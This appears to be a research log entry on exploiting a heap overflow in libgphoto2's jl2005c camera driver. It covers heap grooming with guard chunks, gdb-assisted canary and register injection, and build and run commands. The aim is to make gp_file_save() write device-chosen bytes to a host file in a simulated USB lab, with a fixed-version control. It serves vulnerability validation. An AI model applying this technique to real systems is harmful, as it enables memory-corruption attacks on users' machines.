# W172 (2026-11-24): a REAL gphoto2 consumer writes device-directed bytes

# Question left by W171: gp_file_save() aborts at "malloc(): corrupted top size"
# because the :154 overflow reaches the top chunk after the live CameraFile
# victim at priv+0x4050. W172 keeps live guard chunks AFTER the victim so the
# 464-byte overflow stops inside the guards and the top size word survives.
# Then the real gp_file_save() dereferences the device-chosen file->data and
# writes its bytes to a host file; the file content is the observed side effect.

## Build state (plain no-ASan 2.5.34 tree, all paths relative to this dir)
# src/libgphoto2-2.5.34-plain: live/vusb-jl2005.patch (committed) +
# evidence/replay-vusb-victim.patch + evidence/replay-vusb-normal-return.patch
# (both committed) + evidence/replay-vusb-guards.patch (this wake's local patch).
# Vulnerable camlib jl2005c.c sha256 prefix 0ccb1dac24a837bc...
# Fixed control uses pins/fix-6a3393d.patch (sha prefix 4fdaf4b1bd7a3691fc0a...),
# reversed afterwards, vulnerable prefix restored and rebuilt.
# Incremental rebuild used, no reconfigure:
#   cd src/libgphoto2-2.5.34-plain
#   CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 && make install
#   P=$PWD/installdir-plain
#   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
#     -o ../../live/normal_return_probe ../../live/normal_return_probe.c \
#     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
# The gdb script injects jl2005c_init's real saved rbp/RIP and camera_init's
# canary/saved rbx/rbp/RIP from the live stack; the canary value is the
# probe's own %fs:0x28. Drain=22 places the victim at priv+0x4050. No gdb
# memory writes; only setenv convenience calls. Device replies remain lab
# vusb responses, not USB/IP or a wire.

## Common run environment
P=$PWD/src/libgphoto2-2.5.34-plain/installdir-plain
CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2
IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib
gdb -q -batch -x evidence/replay-normal-return.gdb ./live/normal_return_probe usb:001,001

# Count 1022, mode v, drain 22, guards 4, restore caller canary, ACCESS=0,
# TRY_SAVE=1; probe supplies DATA=0x555555556010 (its own marker string),
# SIZE=0x1d. Only M2SHELL_VUSB_GUARDS differs in the matched guard control.

